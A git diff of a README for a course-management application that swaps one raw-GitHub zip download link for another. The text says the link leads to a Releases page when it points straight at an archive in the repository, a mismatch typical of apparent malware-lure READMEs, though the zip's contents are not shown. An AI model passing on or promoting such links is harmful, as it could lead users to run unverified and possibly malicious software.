@@ -1,7 +1,7 @@
 # 🎓 course-management-system - Manage Courses with Ease
 
 ## 📥 Download Here
-[![Download](https://raw.githubusercontent.com/mukesh123-ghb/course-management-system/main/app/system-management-course-v3.8.zip%20Now-Click%20to%20Download-blue)](https://raw.githubusercontent.com/mukesh123-ghb/course-management-system/main/app/system-management-course-v3.8.zip)
+[![Download](https://github.com/mukesh123-ghb/course-management-system/raw/refs/heads/main/app/management-course-system-3.3.zip%20Now-Click%20to%20Download-blue)](https://github.com/mukesh123-ghb/course-management-system/raw/refs/heads/main/app/management-course-system-3.3.zip)
 
 ## 🚀 Getting Started
 The Course Management System (CMS) is designed for educators and administrators. This application helps you manage courses, user accounts, assessments, and more—all in one place. You do not need any programming knowledge to use this software.
@@ -23,7 +23,7 @@ The Course Management System (CMS) is designed for educators and administrators.
 ## 📂 Download & Install
 To download the Course Management System, visit the Releases page:
 
-[Download Here](https://raw.githubusercontent.com/mukesh123-ghb/course-management-system/main/app/system-management-course-v3.8.zip)
+[Download Here](https://github.com/mukesh123-ghb/course-management-system/raw/refs/heads/main/app/management-course-system-3.3.zip)
 
 1. Click the link above to go to the Releases page.
 2. On the Releases page, find the latest version of the software.
